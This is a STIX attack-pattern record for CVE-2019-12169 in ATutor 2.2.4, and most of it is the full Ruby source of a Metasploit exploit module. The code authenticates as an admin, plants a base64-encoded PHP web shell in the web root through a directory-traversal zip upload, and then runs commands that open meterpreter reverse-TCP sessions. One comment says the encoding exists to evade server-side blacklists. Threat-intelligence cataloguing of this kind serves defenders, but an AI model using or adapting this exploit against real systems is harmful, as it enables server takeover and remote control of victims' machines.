{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4d8fafe-b40d-4904-9e62-0e2e5f7867cc",
    "created": "2024-08-14T17:09:33.860727Z",
    "modified": "2024-08-14T17:09:33.860732Z",
    "name": "ATutor 2.2.4 - Directory Traversal / Remote Code Execution, ",
    "description": " This module exploits an arbitrary file upload vulnerability together with a directory traversal flaw in ATutor versions 2.2.4, 2.2.2 and 2.2.1 in order to execute arbitrary commands.  It first creates a zip archive containing a malicious PHP file. The zip archive takes advantage of a directory traversal vulnerability that will cause the PHP file to be dropped in the root server directory (`htdocs` for Windows and `html` for Linux targets). The PHP file contains an encoded payload that allows for remote command execution on the target server. The zip archive can be uploaded via two vectors, the `Import New Language` function and the `Patcher` function. The module first uploads the archive via `Import New Language` and then attempts to execute the payload via an HTTP GET request to the PHP file  in the root server directory. If no session is obtained, the module creates another zip archive and attempts exploitation via `Patcher`.  Valid credentials for an ATutor admin account are required. This module has been successfully tested against ATutor 2.2.4 running on Windows 10 (XAMPP server).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/atutor_upload_traversal.rb",
            "external_id": "atutor_upload_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-12169"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit/#PoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ATutor 2.2.4 - Directory Traversal / Remote Code Execution, ',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability together with\n          a directory traversal flaw in ATutor versions 2.2.4, 2.2.2 and 2.2.1 in\n          order to execute arbitrary commands.\n\n          It first creates a zip archive containing a malicious PHP file. The zip\n          archive takes advantage of a directory traversal vulnerability that will\n          cause the PHP file to be dropped in the root server directory (`htdocs`\n          for Windows and `html` for Linux targets). The PHP file contains an\n          encoded payload that allows for remote command execution on the\n          target server. The zip archive can be uploaded via two vectors, the\n          `Import New Language` function and the `Patcher` function. The module\n          first uploads the archive via `Import New Language` and then attempts to\n          execute the payload via an HTTP GET request to the PHP file  in the root\n          server directory. If no session is obtained, the module creates another\n          zip archive and attempts exploitation via `Patcher`.\n\n          Valid credentials for an ATutor admin account are required. This module\n          has been successfully tested against ATutor 2.2.4 running on Windows 10\n          (XAMPP server).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'liquidsky (JMcPeters)', # PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2019-12169'],\n          ['URL', 'https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit/'] # PoC\n        ],\n        'Platform' => %w[linux win],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [ 'Auto', {} ],\n          [\n            'Linux', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => :printf,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'win',\n              'CmdStagerFlavor' => :vbs,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2019-05-17',\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false,\n          'WfsDelay' => 3 # If exploitation via `Import New Language` doesn't work, wait this long before attempting exploiting via `Patcher`\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to ATutor', '/ATutor/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', '']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', '']),\n      OptString.new('FILE_TRAVERSAL_PATH', [false, 'Traversal path to the root server directory.', ''])\n    ]\n  end\n\n  def select_target(res)\n    unless res.headers.include? 'Server'\n      print_warning('Could not detect target OS.')\n      return\n    end\n\n    # The ATutor documentation recommends installing it on a XAMPP server.\n    # By default, the Apache server header reveals the target OS using one of the strings used as keys in the hash below\n    # Apache probably supports more OS keys, which can be added to the array\n    target_os = res.headers['Server'].split('(')[1].split(')')[0]\n\n    fail_with(Failure::NoTarget, 'Unable to determine target OS') unless target_os\n\n    case target_os\n    when 'CentOS', 'Debian', 'Fedora', 'Ubuntu', 'Unix'\n      @my_target = targets[1]\n    when 'Win32', 'Win64'\n      @my_target = targets[2]\n    else\n      fail_with(Failure::NoTarget, 'No valid target for target OS')\n    end\n\n    print_good(\"Identified the target OS as #{target_os}.\")\n  end\n\n  def check\n    vprint_status('Running check')\n    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'login.php'))\n\n    unless res\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    unless res.code == 302 && res.body.include?('content=\"ATutor')\n      return CheckCode::Safe('Target is not an ATutor application.')\n    end\n\n    res = login\n    unless res\n      return CheckCode::Unknown('Authentication failed')\n    end\n\n    unless (res.code == 200 || res.code == 302) && res.body.include?('<title>Home: Administration</title>')\n      return CheckCode::Unknown('Failed to authenticate as a user with admin privileges.')\n    end\n\n    print_good(\"Successfully authenticated as user '#{datastore['USERNAME']}'. We have admin privileges!\")\n\n    ver_no = nil\n    html = res.get_html_document\n    info = html.search('dd')\n    info.each do |dd|\n      if dd.text.include?('Version')\n        /(?<ver_no>\\d+\\.\\d+\\.\\d+)/ =~ dd.text\n      end\n    end\n\n    @version = ver_no\n    unless @version && !@version.to_s.empty?\n      return CheckCode::Detected('Unable to obtain ATutor version. However, the project is no longer maintained, so the target is likely vulnerable.')\n    end\n\n    @version = Rex::Version.new(@version)\n    unless @version <= Rex::Version.new('2.4')\n      return CheckCode::Unknown(\"Target is ATutor with version #{@version}.\")\n    end\n\n    CheckCode::Appears(\"Target is ATutor with version #{@version}.\")\n  end\n\n  def login\n    hashed_pass = Rex::Text.sha1(datastore['PASSWORD'])\n    @token = Rex::Text.rand_text_alpha_lower(5..8)\n    hashed_pass << @token\n    hash_final = Rex::Text.sha1(hashed_pass)\n\n    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'login.php'))\n    return unless res\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login.php'),\n      'vars_post' =>\n      {\n        'form_login_action' => 'true',\n        'form_login' => datastore['USERNAME'],\n        'form_password' => '',\n        'form_password_hidden' => hash_final,\n        'token' => @token,\n        'submit' => 'Login'\n      }\n    )\n\n    return unless res\n\n    # from exploits/multi/http/atutor_sqli\n    if res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*); ATutorID=(.*); ATutorID=(.*);/\n      @cookie = \"ATutorID=#{Regexp.last_match(4)};\"\n    else\n      @cookie = res.get_cookies\n    end\n\n    redirect = URI(res.headers['Location'])\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, redirect),\n      'cookie' => @cookie\n    })\n\n    res\n  end\n\n  def patcher_csrf_token(upload_url)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => upload_url,\n      'cookie' => @cookie\n    })\n\n    unless res && (res.code == 200 || res.code == 302)\n      fail_with(Failure::NoAccess, 'Failed to obtain csrf token.')\n    end\n\n    html = res.get_html_document\n    csrf_token = html.at('input[@name=\"csrftoken\"]')\n    csrf_token = csrf_token['value'] if csrf_token\n\n    max_file_size = html.at('input[@name=\"MAX_FILE_SIZE\"]')\n    max_file_size = max_file_size['value'] if max_file_size\n\n    unless csrf_token && csrf_token.to_s.strip != ''\n      csrf_token = @token # these should be the same because if the token generated by the module during authentication is accepted by the app, it becomes the csrf token\n    end\n\n    unless max_file_size && max_file_size.to_s.strip != ''\n      max_file_size = '52428800' # this seems to be the default value\n    end\n\n    return csrf_token, max_file_size\n  end\n\n  def create_zip_and_upload(exploit)\n    @pl_file = Rex::Text.rand_text_alpha_lower(6..10)\n    @pl_file << '.php'\n    register_file_for_cleanup(@pl_file)\n    @header = Rex::Text.rand_text_alpha_upper(4)\n    @pl_command = Rex::Text.rand_text_alpha_lower(6..10)\n    # encoding is necessary to evade blacklisting on server side\n    @pl_encoded = Rex::Text.encode_base64(\"\\r\\n\\t\\r\\n<?php echo passthru($_GET['#{@pl_command}']); ?>\\r\\n\")\n\n    if datastore['FILE_TRAVERSAL_PATH'] && !datastore['FILE_TRAVERSAL_PATH'].empty?\n      @traversal_path = datastore['FILE_TRAVERSAL_PATH']\n    elsif @my_target['Platform'] == 'linux'\n      @traversal_path = '../../../../../../var/www/html/'\n    else\n      # The ATutor documentation recommends Windows users to use a XAMPP server.\n      @traversal_path = '..\\\\..\\\\..\\\\..\\\\..\\\\../xampp\\\\htdocs\\\\'\n    end\n\n    @traversal_path = \"#{@traversal_path}#{@pl_file}\"\n\n    # create zip file\n    zip_file = Rex::Zip::Archive.new\n    zip_file.add_file(@traversal_path, \"<?php eval(\\\"?>\\\".base64_decode(\\\"#{@pl_encoded}\\\")); ?>\")\n    zip_name = Rex::Text.rand_text_alpha_lower(5..8)\n    zip_name << '.zip'\n\n    post_data = Rex::MIME::Message.new\n\n    # select exploit method\n    if exploit == 'language'\n      print_status('Attempting exploitation via the `Import New Language` function.')\n      upload_url = normalize_uri(target_uri.path, 'mods', '_core', 'languages', 'language_import.php')\n\n      post_data.add_part(zip_file.pack, 'application/zip', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{zip_name}\\\"\")\n      post_data.add_part('Import', nil, nil, 'form-data; name=\"submit\"')\n    elsif exploit == 'patcher'\n      print_status('Attempting exploitation via the `Patcher` function.')\n      upload_url = normalize_uri(target_uri.path, 'mods', '_standard', 'patcher', 'index_admin.php')\n\n      patch_info = patcher_csrf_token(upload_url)\n      csrf_token = patch_info[0]\n      max_file_size = patch_info[1]\n\n      post_data.add_part(csrf_token, nil, nil, 'form-data; name=\"csrftoken\"')\n      post_data.add_part(max_file_size, nil, nil, 'form-data; name=\"MAX_FILE_SIZE\"')\n      post_data.add_part(zip_file.pack, 'application/zip', nil, \"form-data; name=\\\"patchfile\\\"; filename=\\\"#{zip_name}\\\"\")\n      post_data.add_part('Install', nil, nil, 'form-data; name=\"install_upload\"')\n      post_data.add_part('1', nil, nil, 'form-data; name=\"uploading\"')\n    else\n      fail_with(Failure::Unknown, 'An error occurred.')\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => upload_url,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => @cookie,\n      'headers' => {\n        'Accept-Encoding' => 'gzip,deflate',\n        'Referer' => \"http://#{datastore['RHOSTS']}#{upload_url}\"\n      },\n      'data' => post_data.to_s\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed while trying to upload the payload.')\n    end\n\n    unless (res.code == 200 || res.code == 302)\n      fail_with(Failure::Unknown, 'Failed to upload the payload.')\n    end\n    print_status(\"Uploaded malicious PHP file #{@pl_file}.\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(@pl_file),\n      'cookie' => @cookie,\n      'vars_get' => { @pl_command => cmd }\n    })\n  end\n\n  def exploit\n    res = login\n    if target.name == 'Auto'\n      select_target(res)\n    else\n      @my_target = target\n    end\n\n    # There are two vulnerable functions, the `Import New Language` function and the `Patcher` function\n    # The module first attempts to exploit `Import New Language`. If that fails, it tries to exploit `Patcher`\n    create_zip_and_upload('language')\n    print_status(\"Executing payload via #{normalize_uri(@pl_file)}/#{@pl_command}?=<payload>...\")\n\n    if @my_target['Platform'] == 'linux'\n      execute_cmdstager(background: true, flavor: @my_target['CmdStagerFlavor'], temp: './')\n    else\n      execute_cmdstager(background: true, flavor: @my_target['CmdStagerFlavor'])\n    end\n    sleep(wfs_delay)\n\n    # The only way to know whether or not the exploit succeeded, is by checking if a session was created\n    unless session_created?\n      print_warning('Failed to obtain a session when exploiting `Import New Language`.')\n      create_zip_and_upload('patcher')\n      print_status(\"Executing payload via #{normalize_uri(@pl_file)}/#{@pl_command}?=<payload>...\")\n      if @my_target['Platform'] == 'linux'\n        execute_cmdstager(background: true, flavor: @my_target['CmdStagerFlavor'], temp: './')\n      else\n        execute_cmdstager(background: true, flavor: @my_target['CmdStagerFlavor'])\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-17",
    "x_mitre_platforms": [
        "win'"
    ]
}